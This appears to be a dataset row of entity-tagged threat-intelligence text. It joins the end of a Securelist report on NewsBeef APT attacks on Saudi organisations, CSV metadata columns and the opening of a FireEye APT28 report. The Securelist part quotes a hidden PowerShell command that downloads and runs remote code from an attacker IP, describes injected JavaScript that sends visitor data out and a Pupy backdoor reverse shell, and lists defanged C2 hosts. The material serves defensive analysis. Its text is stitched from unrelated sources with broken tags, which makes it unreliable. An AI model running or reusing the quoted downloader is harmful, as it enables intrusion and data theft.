<IOC>hxxps://ntg-sa[.]com/Downloads/Chrome_Update.exe</IOC>

In this scenario, the poisoned <SOFTWARE>Flashplayer</SOFTWARE>, <SOFTWARE>Citrix</SOFTWARE>, or <SOFTWARE>Chrome</SOFTWARE> installer drops the file
“<IOC>install.bat</IOC>”. The batch file runs the PowerShell command:

powershell.exe -w hidden -noni -nop -c “iex(New-Object
System.Net.WebClient).DownloadString(‘http://139.59.46[.]154:3485/eiloShaegae1′)

The command downloads “eiloShaegae1”, another PowerShell downloader script. This
second PowerShell downloader script downloads and runs the payload; a <MALWARE>PowerSploit</MALWARE>
ReflectivePEInjection script, “<IOC>hxxp://139.59.46[.]154:3485/IMo8oosieVai</IOC>”.

The script maintains and then decodes a base64 string. This base64 string, is the <MALWARE>Pupy</MALWARE>
backdoor DLL, which is loaded and run in-memory, never touching the disk. This <MALWARE>Pupy</MALWARE>
backdoor immediately communicates with <IOC>139.59.46[.1]54</IOC> over obfs3, posting collected
system data and retrieving commands.

This selection of “The Threebfuscator” for command and control (C2) communications is
interesting, because it is an obfuscating protocol used to mask Tor communications. It is
possible that the use of obfs3 indicates the attackers’ understanding of its effectiveness
against outbound connection monitoring.

Another notable spoofed domain used during this campaign is the “<IOC>maps-modon[.]club</IOC>”
domain. The domain “<IOC>maps.modon.gov[.]sa</IOC></IO\>” was compromised in <TIMESTAMP>December 2016</TIMESTAMP>, and
the “<IOC>maps-modon[.]club</IOC>” domain created on <TIMESTAMP>December 8, 2016</TIMESTAMP>. The domain shared the

https://securelist.com/twas-the-night-before/91599/ntgsa_home/


<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 6/13

same IP address (<IOC>45.76.32[.]252</IOC>) as “<IOC>ntg-sa[.]com</IOC>”. Although we did not observe any
malicious documents retrieved from that domain, it is likely that the domain served the
same documents as <IOC>ntg-sa[.]com</IOC>. The filenames of the malicious <SOFTWARE>Office</SOFTWARE> documents
(hosted at the spoofed <ORG>NTG</ORG> site) are relevant to typical IT and contracting resources and
indicate that this scheme relies on effective social engineering tactics related to human
resources and IT activities.

In other schemes, the attackers sent
macro-enabled <SOFTWARE>Office</SOFTWARE> attachments
from spoofed law firm identities (or
other relevant service providers) to
targets in <COUNTRY>SA</COUNTRY>. The law firm in this
scheme is based in the <COUNTRY>United Kingdom</COUNTRY> and is the sole location for
targets outside of <COUNTRY>SA</COUNTRY> for this campaign.
Below is a screenshot of a fake legal
proposal in <SOFTWARE>Word</SOFTWARE> doc format,
containing malicious macros and
PowerShell code.

The malicious document follows the same chain as the poisoned <SOFTWARE>Flash player</SOFTWARE> or <SOFTWARE>Chrome Installer</SOFTWARE>:

https://securelist.com/twas-the-night-before/91599/spears/
https://securelist.com/twas-the-night-before/91599/lawspear/


<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 7/13

Compromised servers and injected <SOFTWARE>JavaScript</SOFTWARE>

Starting in <TIMESTAMP>October 2016</TIMESTAMP>, <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> compromised a set of legitimate servers (shown
below), and injected <SOFTWARE>JavaScript</SOFTWARE> to redirect visitors to <IOC>hxxp://analytics-google[.]org:69/Check.aspx:</IOC>

The entire list of compromised servers
is exclusively Saudi Arabian, and
includes organizations from the
following industries:

Energy services for industrial
processes
<INDUSTRY>Telecom engineering and
implementation services</INDUSTRY>
<INDUSTRY>Shipping and logistics</INDUSTRY>
<INDUSTRY>Metal engineering and manufacturing</INDUSTRY>
<INDUSTRY>Information technology services</INDUSTRY>
<INDUSTRY>Cement and building materials</INDUSTRY>

These recent attacks against
legitimate servers (when compared to previous <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> activity) indicate that
<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> operators have improved their technical skills, specifically their ability to
covertly inject <SOFTWARE>JavaScript</SOFTWARE> code into served web pages. Their injection and obfuscation
techniques enable the actor to serve the same <SOFTWARE>JavaScript</SOFTWARE> with every page visit to the
“<TECHNIQUE>watering hole</TECHNIQUE>” site as well as increase the difficulty of identifying the malicious
<SOFTWARE>JavaScript</SOFTWARE> source on compromised sites.

For example, on a <ORG>Saudi government</ORG> website, the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> delivered packed
<SOFTWARE>JavaScript</SOFTWARE> into the bottom of a referenced script that is included in every page served
from the site (the packed and unpacked <SOFTWARE>JavaScript</SOFTWARE> is shown below). The <SOFTWARE>JavaScript</SOFTWARE>
forces visiting web browsers to collect and send (via a POST request) web browser,
browser version, country of origin, and IP address data to the attacker controlled server
“<IOC>jquerycodedownload[.]live/check.aspx</IOC>”.

It is likely that this collection of visitor information represents an attempt to limit the
number of infections to a specific target subset and reduce the attacker’s operational
footprint. Although we did not identify injected <SOFTWARE>JavaScript</SOFTWARE> related to the “<IOC>analytics-
google[.]org/check.aspx</IOC>” redirections, it is likely that it performed similar data collection

https://securelist.com/twas-the-night-before/91599/pupychain/
https://securelist.com/twas-the-night-before/91599/compromisedservers1/


<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 8/13

and exfiltration (via POST). This technique appears to be an improvement over the
simple .JPG beaconing which researchers observed in previous <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> <TECHNIQUE>watering hole attacks</TECHNIQUE>. Packed <SOFTWARE>JavaScript</SOFTWARE>:

The most trafficked of the compromised sites (which redirect to “<IOC>jquerycode-
download[.]live</IOC>”) appears to be the government site at “<IOC>scsb.gov[.]sa/portal/</IOC>”. A high
volume of redirections from the compromised site continues into <TIMESTAMP>mid-January 2017</TIMESTAMP>.

https://securelist.com/twas-the-night-before/91599/packedjs/
https://securelist.com/twas-the-night-before/91599/unpacked/


<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 9/13

Below is a list of compromised websites and the associated URL that serves the
injected, second layer <SOFTWARE>JavaScript</SOFTWARE>. Note that the <SOFTWARE>JavaScript</SOFTWARE> resource changes on every
compromised website among many other referenced <SOFTWARE>JavaScript</SOFTWARE> sources, making it
difficult to track down the source of the malicious script per site:

<IOC>www.taqa.com[.]sa/Scroll-jquery.js</IOC>

https://securelist.com/twas-the-night-before/91599/taqa/


<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 10/13

<IOC>199099.gov[.]sa/_LAYOUTS/Yesser.NCC/js/jquery-1.7.2.min.js</IOC>

Multiple other relevant sites were compromised and redirecting as well.

The <MALWARE>Pupy</MALWARE> backdoor

<MALWARE>Pupy</MALWARE> is an open source, multi-platform (<SOFTWARE>Windows</SOFTWARE>, <SOFTWARE>Linux</SOFTWARE>, <SOFTWARE>OSX</SOFTWARE>, <SOFTWARE>Android</SOFTWARE>), multi-function
backdoor. The backdoor is mainly written in <SOFTWARE>Python</SOFTWARE> and uses code from other open
source attack tools like <MALWARE>PowerSploit</MALWARE>, <MALWARE>Mimikatz</MALWARE>, <MALWARE>laZagne</MALWARE>, etc. <MALWARE>Pupy</MALWARE> can generate
backconnect or bindport payloads in multiple formats: PE executables (x86/x64) for
<SOFTWARE>Windows</SOFTWARE>, ELF binary/.so for <SOFTWARE>Linux</SOFTWARE>, reflective DLLs (x86/x64), pure <SOFTWARE>Python</SOFTWARE> files,
PowerShell, apk, and Rubber Ducky script (<SOFTWARE>Windows</SOFTWARE>).

The malicious DLL deployed by <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> contains <SOFTWARE>Python</SOFTWARE> code, a <SOFTWARE>Python</SOFTWARE> interpreter,
and the MSVC runtime library as well as code that loads the <SOFTWARE>Python</SOFTWARE> interpreter, runs
<SOFTWARE>Python</SOFTWARE> code and exports some functions for <SOFTWARE>Python</SOFTWARE>. A configuration string contains
base64-encoded <SOFTWARE>Python</SOFTWARE> code (packed with zlib) with transport configuration and
information about C2 server addresses.

When initiated, the <SOFTWARE>Python</SOFTWARE> code attempts to retrieve and use SOCKS/HTTP proxy
settings from the victim’s computer. The <SOFTWARE>Python</SOFTWARE> code then tries to initiate a reverse
connection to the C2 server (<IOC>139.59.46[.]154:3543</IOC>) using a TCP protocol with RSA+AES
traffic encryption and obfs3 transport using default keys from <MALWARE>Pupy</MALWARE> sources.

https://securelist.com/twas-the-night-before/91599/199099gov/


<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 11/13

After a successful connection, <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> <MALWARE>Pupy</MALWARE> sends information about the infected
computer and waits for commands (which take the form of modules) from the C2 server.
The C2 server can send modules with <SOFTWARE>Python</SOFTWARE> code and compiled <SOFTWARE>Python</SOFTWARE> C extensions.
The main functionality of the backdoor is implemented in packages (<SOFTWARE>Python</SOFTWARE> code,
compiled <SOFTWARE>Python</SOFTWARE> C extensions, compiled executable files) and modules (<SOFTWARE>Python</SOFTWARE> code).
Modules can directly access <SOFTWARE>Python</SOFTWARE> objects on the remote client using the RPyC
module. The <SOFTWARE>Python</SOFTWARE> modules win32com, win32api, and ctypes are used to interact with
the Win32 API. Attackers can use standard modules or write their own. All modules are
executed in the memory (a <MALWARE>Pupy</MALWARE> process can migrate between processes using the
corresponding module).

Conclusion
Previous reports on the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> noted the group’s reliance on open-source tools
to launch simple, yet effective attacks. Historically, the group has used <TECHNIQUE>BeEF</TECHNIQUE> to track
targets and deliver malicious payloads. However, as this recent campaign indicates, the
<THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> appears to have shifted its intrusion toolset away from <TECHNIQUE>BeEF</TECHNIQUE> and
towards macro-enabled malicious <SOFTWARE>Office</SOFTWARE> documents, <MALWARE>PowerSploit</MALWARE>, and <MALWARE>Pupy</MALWARE>. Despite
this shift in toolset, the group still relies on old infrastructure as evidenced by their reuse
of servers hosted by the service providers <ORG>Choopa</ORG> and <ORG>Atlantic.net</ORG>.

The improvements in tactics, techniques and procedures appears to have paid off. The
most recent campaign indicates that the group was able to compromise a larger number
of sites including valuable, high-profile <ORG>SA government</ORG> identities. However, despite these
improvements in technology, the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> continues to rely on social engineering
schemes and open-source tools – attributes that increase the chances of identification.

<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> attacks against Saudi Arabian organizations and individuals (as well as
targets in the European Union) are likely to continue. Additionally, researchers expect
that as the group evolves, its tasking will expand to other organizations doing business
with, or connected to Saudi Arabian organizations and individuals.

Due to the group’s specific target set, it is crucial that <COUNTRY>SA</COUNTRY> security teams, administrators,
and developers (especially web application administrators/developers) update their
<SOFTWARE>WordPress</SOFTWARE>, <SOFTWARE>Joomla</SOFTWARE>, and <SOFTWARE>Drupal</SOFTWARE>-based web applications and plugins – as these assets
are actively scanned and exploited by this <THREAT_ACTOR>APT</THREAT_ACTOR>.

Appendix

Related Object MD5 (executable code, malicious office
documents, <SOFTWARE>JavaScript</SOFTWARE>, powershell, etc)

<IOC>f4d18316e367a80e1005f38445421b1f</IOC>
<IOC>638b74a712a7e45efc9bec126b0f2d87</IOC>
<IOC>45b0e5a457222455384713905f886bd4</IOC>
<IOC>19cea065aa033f5bcfa94a583ae59c08</IOC>
<IOC>ecfc0275c7a73a9c7775130ebca45b74</IOC>



<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 12/13

<IOC>1b5e33e5a244d2d67d7a09c4ccf16e56</IOC>
<IOC>fa72c068361c05da65bf2117db76aaa8</IOC>
<IOC>43fad2d62bc23ffdc6d301571135222c</IOC>
<IOC>ce25f1597836c28cf415394fb350ae93</IOC>
<IOC>03ea9457bf71d51d8109e737158be888</IOC>
<IOC>edfc37461fa66716b53333fd7f841a8e</IOC>
<IOC>623e05dd58d86da76fdfcf9b57032168</IOC>
<IOC>6946836f2feb98d6e8021af6259a02dd</IOC>
<IOC>f4d18316e367a80e1005f38445421b1f</IOC>
<IOC>d87663ce6a9fc0e8bc8180937b3566b9</IOC>
<IOC>f9adf73bf1cdd7cd278e5137d966ddd4</IOC>
<IOC>b8373f909fa228c2b6e7d69f065f30fb</IOC>
<IOC>9b1a06590b091d300781d8fbee180e75</IOC>
<IOC>bcafe408567557289003c79f745f7713</IOC>
<IOC>45b0e5a457222455384713905f886bd4</IOC>
<IOC>83be35956e5d409306a81e88a1dc89fd</IOC>
<IOC>c2165155fcba5b737ee70354b5244be3</IOC>
<IOC>444c93e736194a01bf3b319e3963d746</IOC>
<IOC>0ed61b6f1008000c6dfcd3d842b21971</IOC>
<IOC>3fb33a2747b39a9b1c5c1e41fade595e</IOC>
<IOC>b34fd14105be23480c44cfdf6eb26807</IOC>

URLs

Hosting malicious docs, executables, PowerShell and <MALWARE>Pupy</MALWARE> backdoors

<IOC>moh.com-ho[.]me/Health_insurance_plan.doc</IOC>
<IOC>moh.com-ho[.]me/Health_insurance_registration.doc</IOC>
<IOC>mol.com-ho[.]me/cv_itworx.doc</IOC>
<IOC>mci.com-ho[.]me/cv_mci.doc</IOC>
<IOC>jquerycode-download[.]live/flashplayer23pp_xa_install.exe</IOC>
<IOC>jquerycode-download[.]live/citrixcertificate.exe</IOC>
<IOC>jquerycode-download[.]live/chrome_update.exe</IOC>
<IOC>jquerycode-download[.]live/CitrixReceiver.exe</IOC>
<IOC>jquerycode-download[.]live/check.aspx</IOC>
<IOC>jquerycode-download[.]live/CheckLog.aspx</IOC>
<IOC>https://ntg-sa[.]com/downloads/citrix_certificate.exe</IOC>
<IOC>https://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe</IOC>
<IOC>https://ntg-sa[.]com/Downloads/Chrome_Update.exe</IOC>
<IOC>http://ntg-sa[.]com/cv.doc</IOC>
<IOC>http://ntg-sa[.]com/cv_itworx.doc</IOC>
<IOC>http://ntg-sa[.]com/cv_mci.doc</IOC>
<IOC>http://ntg-sa[.]com/discount_voucher_codes.xlsm</IOC>
<IOC>http://ntg-sa[.]com/Health_insurance_plan.doc</IOC>
<IOC>http://ntg-sa[.]com/Health_insurance_registration.doc</IOC>
<IOC>http://ntg-sa[.]com/job_titles.doc</IOC>
<IOC>http://ntg-sa[.]com/job_titles_itworx.doc</IOC>
<IOC>http://ntg-sa[.]com/job_titles_mci.doc</IOC>



<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

<IOC>https://securelist.com/twas-the-night-before/91599/ 13/13</IOC>

<IOC>http://ntg-sa[.]com/Password_Policy.xlsm</IOC>
<IOC>45.32.186.33</IOC>
<IOC>http://itworx.com-ho[.]me/*</IOC>
<IOC>http://mci.com-ho[.]me/*</IOC>
<IOC>http://moh.com-ho[.]me/*</IOC>
<IOC>http://mol.com-ho[.]me/*</IOC>
<IOC>http://ntg-sa[.]com/*</IOC>
<IOC>taqa.com[.]sa/arabic/resumes/resume.doc</IOC>
<IOC>taqa.com[.]sa/arabic/resumes/resume.doc</IOC>
<IOC>taqa.com[.]sa/arabic/resumes/cv-taqa.doc</IOC>
<IOC>taqa.com[.]sa/arabic/images/certificate.crt.exe</IOC>
<IOC>taqa.com[.]sa/arabic/tempdn/cv-taqa.doc</IOC>
<IOC>104.218.120[.]128/pro.bat</IOC>
<IOC>104.218.120[.]128/msservice-a-2.exe</IOC>
<IOC>104.218.120[.]128/msservice-a-4.exe</IOC>
<IOC>104.218.120[.]128/check.aspx</IOC>
<IOC>104.218.120[.]128:69/checkFile.aspx</IOC>
<IOC>139.59.46[.]154/IMo8oosieVai</IOC>
<IOC>139.59.46[.]154:3485/eiloShaegae1</IOC>
<IOC>69.87.223[.]26/IMo8oosieVai</IOC>
<IOC>69.87.223[.]26:8080/eiloShaegae1</IOC>
<IOC>69.87.223[.]26:8080/p</IOC>

Additional C2

<IOC>analytics-google[.]org:69/check.aspx</IOC>
<IOC>analytics-google[.]org/checkFile.aspx</IOC>
<IOC>jquerycode-download[.]live/check.aspx</IOC>
<IOC>jquerycode-download[.]live/checkFile.aspx</IOC>
<IOC>go-microstf[.]com/checkFile.aspx</IOC>
<IOC>104.218.120[.]128/check.aspx</IOC>
<IOC>104.218.120[.]128:69/checkFile.aspx</IOC>",NewsBeef;NewsBeef APT;APT;NewsBeef/APT33;NewsBeef /APT33,JavaScript;Python;Office;Chrome;Windows;VirusTotal;Flash;Microsoft Office;Outlook;Linux;Citrix Client;Kaspersky Security Network;KSN;Flashplayer;Citrix;Word;Flash player;Chrome Installer;OSX;Android;WordPress;Joomla;Drupal,"Telecom engineering and
implementation services;Shipping and logistics;Metal engineering and manufacturing;Information technology services;Cement and building materials","NTG;USCYBERCOM;SA government;Saudi Arabian government;Choopa, LLC, US;National Technology Group;Saudi government;Choopa;Atlantic.net","the night before;7/5/2019;2016;January 2017;summer of 2016;December 2016;2016 – 2017;2016-2017;Dec 2016;Jan 2017;2015;mid-2015;2017;December 25, 2016;December 8, 2016;October 2016;mid-January 2017",Pupy;PowerSploit;Exploit.Win32.Generic;Trojan-Downloader.Win32.Powdr.a;Trojan-Downloader.MSIL.Steamilik.zzo;Trojan-Downloader.PowerShell.Agent.ah;DangerousObject.Multi.Generic;Mimikatz;laZagne,SA;United States;United Kingdom,"ntg-sa[.]com;d87663ce6a9fc0e8bc8180937b3566b9;jquerycode-download[.]live/flashplayer23pp_xa_install.exe;jquerycode-download[.]live/chrome_update.exe;9b1a06590b091d300781d8fbee180e75;jquerycode-download[.]live/citrixcertificate.exe;maps-modon[.]club;f4d18316e367a80e1005f38445421b1f;45b0e5a457222455384713905f886bd4;jquerycode-download[.]live/check.aspx;taqa.com[.]sa/arabic/resumes/resume.doc;104.218.120[.]128/check.aspx;104.218.120[.]128:69/checkFile.aspx;jquerycode-download[.]live/citrixreceiver.exe;ntg-sa[.]com/downloads/citrix_certificate.exe;ntg.com[.]sa;hxxps://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe;hxxps://ntg-sa[.]com/Downloads/Citrix_Certificate.exe;hxxps://ntg-sa[.]com/Downloads/Chrome_Update.exe;install.bat;hxxp://139.59.46[.]154:3485/IMo8oosieVai;139.59.46[.1]54;maps.modon.gov[.]sa;45.76.32[.]252;hxxp://analytics-google[.]org:69/Check.aspx:;jquerycodedownload[.]live/check.aspx;analytics-
google[.]org/check.aspx;jquerycode-
download[.]live;scsb.gov[.]sa/portal/;www.taqa.com[.]sa/Scroll-jquery.js;199099.gov[.]sa/_LAYOUTS/Yesser.NCC/js/jquery-1.7.2.min.js;139.59.46[.]154:3543;638b74a712a7e45efc9bec126b0f2d87;19cea065aa033f5bcfa94a583ae59c08;ecfc0275c7a73a9c7775130ebca45b74;1b5e33e5a244d2d67d7a09c4ccf16e56;fa72c068361c05da65bf2117db76aaa8;43fad2d62bc23ffdc6d301571135222c;ce25f1597836c28cf415394fb350ae93;03ea9457bf71d51d8109e737158be888;edfc37461fa66716b53333fd7f841a8e;623e05dd58d86da76fdfcf9b57032168;6946836f2feb98d6e8021af6259a02dd;f9adf73bf1cdd7cd278e5137d966ddd4;b8373f909fa228c2b6e7d69f065f30fb;bcafe408567557289003c79f745f7713;83be35956e5d409306a81e88a1dc89fd;c2165155fcba5b737ee70354b5244be3;444c93e736194a01bf3b319e3963d746;0ed61b6f1008000c6dfcd3d842b21971;3fb33a2747b39a9b1c5c1e41fade595e;b34fd14105be23480c44cfdf6eb26807;moh.com-ho[.]me/Health_insurance_plan.doc;moh.com-ho[.]me/Health_insurance_registration.doc;mol.com-ho[.]me/cv_itworx.doc;mci.com-ho[.]me/cv_mci.doc;jquerycode-download[.]live/CitrixReceiver.exe;jquerycode-download[.]live/CheckLog.aspx;https://ntg-sa[.]com/downloads/citrix_certificate.exe;https://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe;https://ntg-sa[.]com/Downloads/Chrome_Update.exe;http://ntg-sa[.]com/cv.doc;http://ntg-sa[.]com/cv_itworx.doc;http://ntg-sa[.]com/cv_mci.doc;http://ntg-sa[.]com/discount_voucher_codes.xlsm;http://ntg-sa[.]com/Health_insurance_plan.doc;http://ntg-sa[.]com/Health_insurance_registration.doc;http://ntg-sa[.]com/job_titles.doc;http://ntg-sa[.]com/job_titles_itworx.doc;http://ntg-sa[.]com/job_titles_mci.doc;https://securelist.com/twas-the-night-before/91599/ 13/13;http://ntg-sa[.]com/Password_Policy.xlsm;45.32.186.33;http://itworx.com-ho[.]me/*;http://mci.com-ho[.]me/*;http://moh.com-ho[.]me/*;http://mol.com-ho[.]me/*;http://ntg-sa[.]com/*;taqa.com[.]sa/arabic/resumes/cv-taqa.doc;taqa.com[.]sa/arabic/images/certificate.crt.exe;taqa.com[.]sa/arabic/tempdn/cv-taqa.doc;104.218.120[.]128/pro.bat;104.218.120[.]128/msservice-a-2.exe;104.218.120[.]128/msservice-a-4.exe;139.59.46[.]154/IMo8oosieVai;139.59.46[.]154:3485/eiloShaegae1;69.87.223[.]26/IMo8oosieVai;69.87.223[.]26:8080/eiloShaegae1;69.87.223[.]26:8080/p;analytics-google[.]org:69/check.aspx;analytics-google[.]org/checkFile.aspx;jquerycode-download[.]live/checkFile.aspx;go-microstf[.]com/checkFile.aspx",,,,,,,"BeEF;watering hole attacks;spearphishing;watering hole;spear-phishing;Browser Exploitation Framework;spearphishing emails;links sent over social media/standalone private
messaging applications",,,32,69,5,17,47,27,7,107,0,0,0,0,0,0,17,0,0
APT28-Center-of-Storm-2017,"<ORG>FireEye</ORG> iSIGHT INTELLIGENCE

<COUNTRY>RUSSIA</COUNTRY> STRATEGICALLY EVOLVES  
ITS CYBER OPERATIONS

<THREAT_ACTOR>APT28</THREAT_ACTOR>:  
AT THE CENTER  
OF THE STORM

SPECIAL REPORT / JANUARY 2017



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM i

CONTENTS

Introduction 1

Overview 2

<THREAT_ACTOR>APT28</THREAT_ACTOR> Targeting And Intrusion Activity 3

Table 1 -<THREAT_ACTOR>APT28</THREAT_ACTOR> Targeting of Political Entities and Intrusion Activity 4

Table 2 -<THREAT_ACTOR>APT28</THREAT_ACTOR> Network Activity Has Likely Supported 
Information Operations  5

From Olympic Slight to Data Leak: 

Investigating<THREAT_ACTOR>APT28</THREAT_ACTOR> at the World Anti-Doping Agency 6

Conclusion 8

Appendix 9



The <ORG>Democratic National Committee’s</ORG> (<ORG>DNC</ORG>) June 

2016 announcement attributing its network breach 

to the<ORG>Russian Government</ORG> triggered an international 

debate over Russia’s sponsorship of information 

operations against the <COUNTRY>U.S.</COUNTRY> 

INTRODUCTION

At issue is the question of proof: did the<ORG>Russian Government</ORG> direct the group 
responsible for the breaches and related data leaks? If so, is this simply a matter  
of accepted state espionage, or did it cross a line? Was the <ORG>DNC</ORG> breach part  
of a concerted effort by the<ORG>Russian Government</ORG> to interfere with the <COUNTRY>U.S.</COUNTRY> 
presidential election?

Unfortunately, we have failed to ask the most consequential question: how will 
<COUNTRY>RUSSIA</COUNTRY> continue to employ a variety of methods, including hacks and leaks,  
to undermine the institutions, policies, and actors that the<ORG>Russian Government</ORG> 
perceives as constricting and condemning its forceful pursuit of its state aims? 

Our visibility into the operations of<THREAT_ACTOR>APT28</THREAT_ACTOR> - a group we believe the Russian 
Government sponsors - has given us insight into some of the government’s  
targets, as well as its objectives and the activities designed to further them.  
We have tracked and profiled this group through multiple investigations, endpoint 
and network detections, and continuous monitoring. Our visibility into APT28’s 
operations, which date to at least 2007, has allowed us to understand the group’s 
malware, operational changes, and motivations. This intelligence has been critical 
to protecting and informing our clients, exposing this threat, and strengthening  
our confidence in attributing<THREAT_ACTOR>APT28</THREAT_ACTOR> to the<ORG>Russian Government</ORG>.

 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 1



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 2

OVERVIEW

On <TIMESTAMP>December 29, 2016</TIMESTAMP>, the <ORG>Department of Homeland Security</ORG> (<ORG>DHS</ORG>) 
and <ORG>Federal Bureau of Investigation</ORG> (<ORG>FBI</ORG>) released a Joint Analysis 
Report confirming FireEye’s long held public assessment that the Russian 
Government sponsors<THREAT_ACTOR>APT28</THREAT_ACTOR>. Since at least 2007,<THREAT_ACTOR>APT28</THREAT_ACTOR> has engaged  
in extensive operations in support of Russian strategic interests.  
The group, almost certainly compromised of a sophisticated and prolific 
set of developers and operators, has historically collected intelligence on 
defense and geopolitical issues.<THREAT_ACTOR>APT28</THREAT_ACTOR> espionage activity has primarily 
targeted entities in the <COUNTRY>U.S.</COUNTRY>, <COUNTRY>Europe</COUNTRY>, and the countries of the former 
<COUNTRY>Soviet Union</COUNTRY>, including governments and militaries, defense attaches, 
media entities, and dissidents and figures opposed to the current <ORG>Russian 
Government</ORG>.

Over the past two years,<COUNTRY>RUSSIA</COUNTRY> appears to have increasingly leveraged 
<THREAT_ACTOR>APT28</THREAT_ACTOR> to conduct information operations commensurate with broader 
strategic military doctrine. After compromising a victim organization, 
<THREAT_ACTOR>APT28</THREAT_ACTOR> will steal internal data that is then leaked to further political 
narratives aligned with Russian interests. To date these have included  
the conflict in <COUNTRY>Syria</COUNTRY>, <ORG>NATO</ORG>-Ukraine relations, the <COUNTRY>European Union</COUNTRY> refugee 
and migrant crisis, the 2016 Olympics and Paralympics Russian athlete 
doping scandal, public accusations regarding Russian state-sponsored 
hacking, and the 2016 <COUNTRY>U.S.</COUNTRY> presidential election. 

This report details our observations of APT28’s 
targeting, and our investigation into a related 
breach. We also provide an update on shifts in the 
group’s tool development and use, and summarize 
the tactics<THREAT_ACTOR>APT28</THREAT_ACTOR> employs to compromise its victims.



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 3

<THREAT_ACTOR>APT28</THREAT_ACTOR> TARGETING AND  
INTRUSION ACTIVITY

In <TIMESTAMP>October 2014</TIMESTAMP>,<ORG>FireEye</ORG> released<THREAT_ACTOR>APT28</THREAT_ACTOR>: A Window into 
Russia’s Cyber Espionage Operations?, and characterized 
APT28’s activity as aligning with the Russian Government’s 
strategic intelligence requirements. While tracking<THREAT_ACTOR>APT28</THREAT_ACTOR>, 
we noted the group’s interest in foreign governments and 
militaries, particularly those of European and Eastern  
European nations, as well as regional security organizations, 
such as the <ORG>North Atlantic Treaty Organization</ORG> (<ORG>NATO</ORG>)  
and the Organization for Security and Cooperation  
in <COUNTRY>Europe</COUNTRY> (OSCE), among others. Table 1 highlights  
some recent examples of this activity.



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 4

1.  Gauquelin, Blaise. “La Russie soupçonnée d’être responsable d’un piratage informatique contre l’OSCE.” Le Monde. 28 Dec. 2016. Web. 29 Dec. 2016. 
2.  Trend Micro refers to activity corresponding to FireEye’s<THREAT_ACTOR>APT28</THREAT_ACTOR> as “Pawn Storm.”
3.  Hacquebord Feike. “Pawn Storm Targets German Christian Democratic Union.” Trend Micro. 11 May 2016. Web. 29 Dec. 2016. 
4.  Hacquebord Feike. “Pawn Storm’s Domestic Spying Campaign Revealed; Ukraine and US Top Global Targets.” TrendLabs Security Intelligence Blog, Trend Micro. 18 August 2015. Web. 29 Dec.  2016. 
5.  “Neuer Hackerangriff auf Bundespolitiker / BSI warnt Parteien vor Cyberangriffen.” Westdeutscher Rundfunk. 20 Sept. 2016. Web. 29 Dec. 2016. 
 6.  “Russia ‘was Behind German Parliament Hack.’” The BBC. 13 May 2016. Web. 29 Dec. 2016. 
 7, Kharouni, Loucif. et al. “Operation Pawn Storm: Using Decoys to Evade Detection.” Trend Micro. 22 Oct. 2014. Web. 3 Jan. 2017. 

TABLE 1 :<THREAT_ACTOR>APT28</THREAT_ACTOR> TARGETING OF POLITICAL ENTITIES AND INTRUSION ACTIVITY

ENTIT Y TIMEFRAME<THREAT_ACTOR>APT28</THREAT_ACTOR> TARGETING AND INTRUSION ACTIVIT Y 

OSCE NOVEMBER 2016
The OSCE confirmed that it had suffered an intrusion,  
which a Western intelligence service attributed to<THREAT_ACTOR>APT28</THREAT_ACTOR>.1 

Germany's Christian  
Democratic Union (CDU)

APRIL - MAY 2016

Researchers at Trend Micro observed<THREAT_ACTOR>APT28</THREAT_ACTOR>  establish a fake  
CDU email server and launch phishing emails against CDU  
members in an attempt to obtain their email credentials and access 
their accounts.2,3 

Pussy Riot AUGUST 2015
<THREAT_ACTOR>APT28</THREAT_ACTOR> targets Russian rockers and dissidents Pussy Riot via 
spear-phishing emails.4

<ORG>NATO</ORG>, Afghan Ministry  
of Foreign Affairs, Pakistani 
Military

JULY 2015
<THREAT_ACTOR>APT28</THREAT_ACTOR> used two domains (nato-news.com and bbc-news.org) to host 
an <SOFTWARE>Adobe Flash</SOFTWARE> zero-day exploit to target <ORG>NATO</ORG>, the <ORG>Afghan Ministry 
of Foreign Affairs</ORG>, and the <ORG>Pakistani military</ORG>.

<ORG>German Bundestag</ORG>  
& Political Parties

<TIMESTAMP>JUNE 2015</TIMESTAMP>

Germany’s Federal Office for Security in Information Technology (BSI) 
